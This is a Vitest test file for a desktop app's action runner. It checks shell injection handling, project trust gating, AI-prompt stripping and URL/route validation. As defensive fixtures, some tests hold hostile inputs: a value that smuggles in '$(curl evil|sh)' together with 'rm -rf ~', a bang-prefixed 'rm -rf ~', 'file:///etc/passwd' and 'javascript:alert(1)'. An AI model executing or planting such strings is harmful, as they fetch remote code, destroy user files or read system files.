import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const mocks = vi.hoisted(() => ({
	invoke: vi.fn(),
	send: vi.fn(),
	invokeSkill: vi.fn(),
	iykeFetch: vi.fn(),
	openExternalUrl: vi.fn(),
	navigateFocused: vi.fn(),
}));

vi.mock('@/lib/tauri-cmd', async (orig) => ({
	...(await orig<typeof import('@/lib/tauri-cmd')>()),
	invoke: mocks.invoke,
	listen: vi.fn(() => Promise.resolve(() => {})),
}));

vi.mock('./chi', async (orig) => ({
	...(await orig<typeof import('./chi')>()),
	send: mocks.send,
	invokeSkill: mocks.invokeSkill,
}));

vi.mock('@/lib/iyke/client', () => ({ iykeFetch: mocks.iykeFetch }));

vi.mock('@/lib/transport/shims', async (orig) => ({
	...(await orig<typeof import('@/lib/transport/shims')>()),
	openExternalUrl: mocks.openExternalUrl,
}));

import { usePaneStore } from '@/lib/panes/pane-store';
import { useShellStore } from '@/lib/shell/shell-store';
import type { ActionRun, ActionsTrustStatus, ActionTrust } from '../types';
import { ChiUnavailableError } from './chi';
import { runAction, UNSAFE_WINDOWS_VALUE_MESSAGE, type RunnableAction, type RunScope } from './index';
import { emptyRunVariables } from './interpolate';
import { runHash } from './trust';

let trustStatus: ActionsTrustStatus | Error;

function status(actions: ActionTrust[]): ActionsTrustStatus {
	return {
		projectId: 'p1',
		projectRoot: '/proj',
		actions,
		actionsError: null,
		actionsStale: false,
		keybindings: { hash: null, ruleCount: 0, state: 'absent' },
		keybindingsError: null,
		keybindingsStale: false,
	};
}

async function trusted(id: string, run: ActionRun, state: ActionTrust['state'] = 'trusted'): Promise<ActionTrust> {
	return { id, name: id, kind: run.kind, run, hash: await runHash(run), state };
}

function action(run: ActionRun, scope: RunScope = 'personal', id = 'act'): RunnableAction {
	return { id, name: 'Act', run, scope };
}

const EXEC_OK = {
	ok: true,
	exitCode: 0,
	stdout: 'done\n',
	stderr: '',
	stdoutTruncated: false,
	stderrTruncated: false,
	timedOut: false,
	cwd: '/proj',
	shell: 'sh',
	error: null,
	refusal: null,
};

function execCalls() {
	return mocks.invoke.mock.calls.filter(([cmd]) => cmd === 'action_exec');
}

beforeEach(() => {
	trustStatus = status([]);
	mocks.invoke.mockImplementation(async (cmd: string) => {
		switch (cmd) {
			case 'actions_trust_status':
				if (trustStatus instanceof Error) throw trustStatus;
				return trustStatus;
			case 'action_exec':
				return EXEC_OK;
			case 'action_git_branch':
				return 'main';
			default:
				throw new Error(`unexpected invoke ${cmd}`);
		}
	});
	mocks.send.mockResolvedValue({ runId: 'run-1', via: 'chi-run' });
	mocks.invokeSkill.mockResolvedValue({ runId: 'run-2', via: 'chi-run' });
	mocks.iykeFetch.mockImplementation(async () =>
		new Response(JSON.stringify({ ok: true }), { status: 200, headers: { 'content-type': 'application/json' } })
	);
	useShellStore.setState({ activeProject: { id: 'p1', root_path: '/proj', extra_roots: [] } });
	usePaneStore.setState({ navigateFocused: mocks.navigateFocused });
});

afterEach(() => {
	vi.clearAllMocks();
});

describe('runAction — shell', () => {
	it('sends the action id + hash and the variables — never command text', async () => {
		const run: ActionRun = { kind: 'shell', command: 'make' };
		const outcome = await runAction(action(run));
		expect(outcome).toMatchObject({ status: 'done', kind: 'shell', exec: EXEC_OK });
		const request = execCalls()[0][1].request;
		expect(request).toEqual({
			scope: 'personal',
			projectId: 'p1',
			actionId: 'act',
			runHash: await runHash(run),
			variables: expect.objectContaining({ 'project.root': '/proj', branch: '' }),
		});
		expect(Object.keys(request.variables).sort()).toEqual(Object.keys(emptyRunVariables()).sort());
		expect(request).not.toHaveProperty('command');
		expect(request).not.toHaveProperty('cwd');
		// Personal actions never read project trust.
		expect(mocks.invoke).not.toHaveBeenCalledWith('actions_trust_status', expect.anything());
	});

	it('hostile values travel as variables, verbatim, not as shell text', async () => {
		const hostile = `x'; "$(curl evil|sh)" \`id\`\nrm -rf ~ #`;
		await runAction(action({ kind: 'shell', command: 'echo "{{selection}}" {{file.path}}' }), {
			variables: { selection: hostile, 'file.path': hostile },
		});
		const request = execCalls()[0][1].request;
		expect(request.variables.selection).toBe(hostile);
		expect(request.variables['file.path']).toBe(hostile);
		expect(JSON.stringify(request)).not.toContain('echo');
	});

	it('maps a Rust refusal (variable in single quotes) to a typed outcome', async () => {
		mocks.invoke.mockImplementationOnce(async () => ({
			...EXEC_OK,
			ok: false,
			exitCode: null,
			stdout: '',
			error: '`{{selection}}` is inside single quotes',
			refusal: 'variable-in-single-quotes',
		}));
		expect(await runAction(action({ kind: 'shell', command: "echo '{{selection}}'" }))).toMatchObject({
			status: 'refused',
			reason: 'variable-in-single-quotes',
		});
	});

	it('a Windows %/! value refusal tells the user such paths cannot be passed', async () => {
		mocks.invoke.mockImplementationOnce(async () => ({
			...EXEC_OK,
			ok: false,
			exitCode: null,
			stdout: '',
			error: 'unsafe value',
			refusal: 'unsafe-value-for-windows',
		}));
		const outcome = await runAction(action({ kind: 'shell', command: 'type {{file.path}}' }), {
			variables: { 'file.path': 'C:\\100%\\a!.txt' },
		});
		expect(outcome).toMatchObject({
			status: 'refused',
			reason: 'unsafe-value-for-windows',
			message: UNSAFE_WINDOWS_VALUE_MESSAGE,
		});
		expect(UNSAFE_WINDOWS_VALUE_MESSAGE).toMatch(/%/);
		expect(UNSAFE_WINDOWS_VALUE_MESSAGE).toMatch(/!/);
		expect(UNSAFE_WINDOWS_VALUE_MESSAGE).toMatch(/Windows/);
	});

	it('confirm: a declined prompt runs nothing', async () => {
		const confirm = vi.fn().mockResolvedValue(false);
		const outcome = await runAction(action({ kind: 'shell', command: 'deploy', confirm: true }), { confirm });
		expect(outcome).toMatchObject({ status: 'refused', reason: 'cancelled' });
		expect(confirm).toHaveBeenCalledWith(expect.objectContaining({ command: 'deploy', cwd: '/proj' }));
		expect(execCalls()).toHaveLength(0);
	});

	it('Test run never executes shell — it previews the command', async () => {
		const outcome = await runAction(
			action({ kind: 'shell', command: 'rm {{file.path}}', cwd: '/tmp' }, 'project'),
			{ testRun: true, variables: { 'file.path': '/a b' } }
		);
		expect(outcome).toEqual({
			status: 'preview',
			kind: 'shell',
			testRun: true,
			command: 'rm /a b',
			cwd: '/tmp',
			confirm: false,
		});
		expect(mocks.invoke).not.toHaveBeenCalled();
	});

	it('a failing command reports failed with its result', async () => {
		mocks.invoke.mockImplementationOnce(async () => ({ ...EXEC_OK, ok: false, exitCode: 2 }));
		const outcome = await runAction(action({ kind: 'shell', command: 'false' }));
		expect(outcome).toMatchObject({ status: 'failed', message: 'Exited with status 2.' });
	});
});

describe('runAction — project trust (DEC-55)', () => {
	const gated: ActionRun[] = [
		{ kind: 'shell', command: 'make' },
		{ kind: 'iyke', route: '/pane/navigate' },
		{ kind: 'skill', skill: 'release-status' },
		{ kind: 'workflow', workflow: 'com.x:ship' },
	];

	it('an untrusted project refuses shell, iyke, skill and workflow and offers the sheet', async () => {
		for (const run of gated) {
			const outcome = await runAction(action(run, 'project', 'a1'));
			expect(outcome).toMatchObject({
				status: 'refused',
				kind: run.kind,
				reason: 'untrusted',
				trustSheet: { mode: 'project-actions', projectId: 'p1', actionIds: ['a1'] },
			});
		}
		expect(execCalls()).toHaveLength(0);
		expect(mocks.invokeSkill).not.toHaveBeenCalled();
		expect(mocks.iykeFetch).not.toHaveBeenCalled();
	});

	it('an untrusted project still runs chi and open', async () => {
		expect(await runAction(action({ kind: 'chi', target: 'new', prompt: 'hi' }, 'project'))).toMatchObject({
			status: 'done',
			runId: 'run-1',
		});
		expect(await runAction(action({ kind: 'open', url: '/tasks' }, 'project'))).toMatchObject({ status: 'done' });
		expect(mocks.invoke).not.toHaveBeenCalledWith('actions_trust_status', expect.anything());
	});

	it('trusted: runs, and hands Rust the id + hash to re-check', async () => {
		const run: ActionRun = { kind: 'shell', command: 'make', confirm: false };
		trustStatus = status([await trusted('a1', run)]);
		const outcome = await runAction(action(run, 'project', 'a1'));
		expect(outcome).toMatchObject({ status: 'done' });
		expect(execCalls()[0][1].request).toMatchObject({
			scope: 'project',
			actionId: 'a1',
			runHash: await runHash(run),
		});
	});

	it('a Rust-side trust refusal still offers the trust sheet', async () => {
		const run: ActionRun = { kind: 'shell', command: 'make' };
		trustStatus = status([await trusted('a1', run)]);
		mocks.invoke.mockImplementation(async (cmd: string) => {
			if (cmd === 'actions_trust_status') return trustStatus;
			if (cmd === 'action_exec') {
				return { ...EXEC_OK, ok: false, exitCode: null, error: 'not trusted', refusal: 'untrusted' };
			}
			throw new Error(`unexpected invoke ${cmd}`);
		});
		expect(await runAction(action(run, 'project', 'a1'))).toMatchObject({
			status: 'refused',
			reason: 'untrusted',
			trustSheet: { mode: 'project-actions', projectId: 'p1', actionIds: ['a1'] },
		});
	});

	it('editing a trusted command re-asks', async () => {
		const pinned: ActionRun = { kind: 'shell', command: 'make' };
		trustStatus = status([await trusted('a1', pinned, 'changed')]);
		expect(await runAction(action(pinned, 'project', 'a1'))).toMatchObject({ status: 'refused', reason: 'changed' });
		// …and a caller holding an edited copy against a stale pin re-asks too.
		trustStatus = status([await trusted('a1', pinned)]);
		expect(await runAction(action({ kind: 'shell', command: 'make install' }, 'project', 'a1'))).toMatchObject({
			status: 'refused',
			reason: 'changed',
		});
		expect(execCalls()).toHaveLength(0);
	});

	it('fails closed when trust cannot be read', async () => {
		trustStatus = new Error('project has no root');
		expect(await runAction(action({ kind: 'shell', command: 'make' }, 'project'))).toMatchObject({
			status: 'refused',
			reason: 'trust-unavailable',
		});
	});

	it('a trusted project workflow is still disabled with a reason', async () => {
		const run: ActionRun = { kind: 'workflow', workflow: 'com.x:ship' };
		trustStatus = status([await trusted('w', run)]);
		expect(await runAction(action(run, 'project', 'w'))).toMatchObject({
			status: 'refused',
			reason: 'no-workflow-runner',
		});
	});
});

describe('runAction — chi / skill', () => {
	it('chi SENDS the raw-interpolated prompt and returns the run id', async () => {
		const outcome = await runAction(
			action({ kind: 'chi', target: 'engine', engineId: 'gemini', prompt: 'Explain {{file.path}}' }),
			{ variables: { 'file.path': "/p/it's.ts" } }
		);
		expect(outcome).toMatchObject({ status: 'done', kind: 'chi', runId: 'run-1', via: 'chi-run' });
		expect(mocks.send).toHaveBeenCalledWith({
			prompt: "Explain /p/it's.ts",
			ptyPrompt: "Explain /p/it's.ts",
			target: 'engine',
			engineId: 'gemini',
			scope: 'personal',
		});
	});

	it('chi carries its scope and a control-stripped PTY prompt (DEC-55)', async () => {
		trustStatus = status([]);
		await runAction(action({ kind: 'chi', target: 'active', prompt: 'Explain {{selection}}' }, 'project'), {
			variables: { selection: 'a\r\n!rm -rf ~' },
		});
		expect(mocks.send).toHaveBeenCalledWith({
			// A headless run gets the value raw (§8.2)…
			prompt: 'Explain a\r\n!rm -rf ~',
			// …a PTY inject only ever the stripped one.
			ptyPrompt: 'Explain a !rm -rf ~',
			target: 'active',
			scope: 'project',
		});
	});

	it('a PTY refusal surfaces as a typed reason', async () => {
		mocks.send.mockRejectedValueOnce(new ChiUnavailableError('bang-prompt', 'refused'));
		expect(await runAction(action({ kind: 'chi', target: 'active', prompt: '!ls' }))).toMatchObject({
			status: 'refused',
			reason: 'bang-prompt',
		});
	});

	it('chi test run still sends and shows the run id', async () => {
		expect(await runAction(action({ kind: 'chi', target: 'new', prompt: 'x' }), { testRun: true })).toMatchObject({
			status: 'done',
			testRun: true,
			runId: 'run-1',
		});
	});

	it('chi without an engine returns a typed reason', async () => {
		mocks.send.mockRejectedValueOnce(new ChiUnavailableError('no-engine', 'No engine installed'));
		expect(await runAction(action({ kind: 'chi', target: 'new', prompt: 'x' }))).toMatchObject({
			status: 'refused',
			reason: 'no-engine',
		});
	});

	it('skill dispatches through the adapter', async () => {
		expect(await runAction(action({ kind: 'skill', skill: 'release-status' }))).toMatchObject({
			status: 'done',
			kind: 'skill',
			runId: 'run-2',
		});
		expect(mocks.invokeSkill).toHaveBeenCalledWith({ skill: 'release-status', target: 'active', scope: 'personal' });
		expect(await runAction(action({ kind: 'skill', skill: 'two words' }))).toMatchObject({
			status: 'refused',
			reason: 'invalid-skill',
		});
	});

	it('a trusted project skill carries scope "project" to the adapter (no PTY inject)', async () => {
		const run: ActionRun = { kind: 'skill', skill: 'release-status' };
		trustStatus = status([await trusted('sk', run)]);
		expect(await runAction(action(run, 'project', 'sk'))).toMatchObject({ status: 'done', kind: 'skill' });
		expect(mocks.invokeSkill).toHaveBeenCalledWith({ skill: 'release-status', target: 'active', scope: 'project' });
	});
});

describe('runAction — package scope (N2)', () => {
	it('a package chi / skill is never gated and carries scope "package" (no PTY inject)', async () => {
		// Trust status unreadable: a gated run would refuse (fail-closed).
		trustStatus = new Error('no trust');
		expect(await runAction(action({ kind: 'chi', target: 'active', prompt: '/s v' }, 'package'))).toMatchObject({
			status: 'done',
			kind: 'chi',
		});
		expect(mocks.send).toHaveBeenCalledWith(expect.objectContaining({ target: 'active', scope: 'package' }));
		expect(await runAction(action({ kind: 'skill', skill: 'release-status' }, 'package'))).toMatchObject({
			status: 'done',
			kind: 'skill',
		});
		expect(mocks.invokeSkill).toHaveBeenCalledWith({ skill: 'release-status', target: 'active', scope: 'package' });
		expect(mocks.invoke).not.toHaveBeenCalledWith('actions_trust_status', expect.anything());
	});

	it('a package action of any other kind is refused before it runs', async () => {
		for (const run of [
			{ kind: 'shell', command: 'make' },
			{ kind: 'iyke', route: '/pane/navigate' },
			{ kind: 'open', url: 'https://example.com' },
		] as ActionRun[]) {
			expect(await runAction(action(run, 'package'))).toMatchObject({ status: 'refused', reason: 'package-kind' });
		}
		expect(execCalls()).toHaveLength(0);
		expect(mocks.iykeFetch).not.toHaveBeenCalled();
		expect(mocks.openExternalUrl).not.toHaveBeenCalled();
	});
});

describe('runAction — iyke', () => {
	it('POSTs the six variables as the JSON body to the bridge path', async () => {
		const outcome = await runAction(action({ kind: 'iyke', route: '/pane/navigate' }), {
			variables: { 'pane.url': '/tasks', 'file.path': '/p/a.ts' },
		});
		expect(outcome).toMatchObject({ status: 'done', iyke: { ok: true, status: 200, body: { ok: true } } });
		const [path, init] = mocks.iykeFetch.mock.calls[0];
		expect(path).toBe('/iyke/pane/navigate');
		expect(init.method).toBe('POST');
		expect(JSON.parse(init.body)).toEqual({
			'file.path': '/p/a.ts',
			'file.name': 'a.ts',
			selection: '',
			'project.root': '/proj',
			'pane.url': '/tasks',
			branch: 'main',
		});
	});

	it('GET sends the variables as a query; foreign routes are refused', async () => {
		await runAction(action({ kind: 'iyke', route: '/iyke/state', method: 'GET' }), {
			variables: { branch: 'dev' },
		});
		expect(mocks.iykeFetch.mock.calls[0][0]).toMatch(/^\/iyke\/state\?.*branch=dev/);
		for (const route of ['https://evil.dev/x', '//evil.dev', '/../x', '/a?b=1', 'state']) {
			expect(await runAction(action({ kind: 'iyke', route }))).toMatchObject({
				status: 'refused',
				reason: 'invalid-route',
			});
		}
	});
});

describe('runAction — open / workflow / unknown', () => {
	it('opens a shell route in the focused pane', async () => {
		expect(await runAction(action({ kind: 'open', url: '/files?path={{file.path}}' }), {
			variables: { 'file.path': '/a b' },
		})).toMatchObject({ status: 'done', opened: { kind: 'route', path: '/files?path=%2Fa%20b' } });
		expect(mocks.navigateFocused).toHaveBeenCalledWith('/files?path=%2Fa%20b');
	});

	it('maps pkg:// to the package pane route', async () => {
		await runAction(action({ kind: 'open', url: 'pkg://com.x.tasks/board' }));
		expect(mocks.navigateFocused).toHaveBeenCalledWith('/pkg/com.x.tasks/board');
	});

	it('opens http(s) and mailto with the OS; refuses other schemes', async () => {
		await runAction(action({ kind: 'open', url: 'https://ikenga.dev/docs' }));
		expect(mocks.openExternalUrl).toHaveBeenCalledWith('https://ikenga.dev/docs');
		for (const url of ['javascript:alert(1)', 'file:///etc/passwd', 'nonsense']) {
			expect(await runAction(action({ kind: 'open', url }))).toMatchObject({
				status: 'refused',
				reason: 'invalid-url',
			});
		}
	});

	it('personal workflow is disabled with a reason', async () => {
		expect(await runAction(action({ kind: 'workflow', workflow: 'x' }))).toMatchObject({
			status: 'refused',
			reason: 'no-workflow-runner',
		});
	});

	it('an unknown kind or variable is refused, never thrown', async () => {
		expect(await runAction(action({ kind: 'teleport' } as unknown as ActionRun))).toMatchObject({
			status: 'refused',
			reason: 'unknown-kind',
		});
		expect(await runAction(action({ kind: 'chi', target: 'new', prompt: '{{nope}}' }))).toMatchObject({
			status: 'refused',
			reason: 'unknown-variable',
		});
	});
});
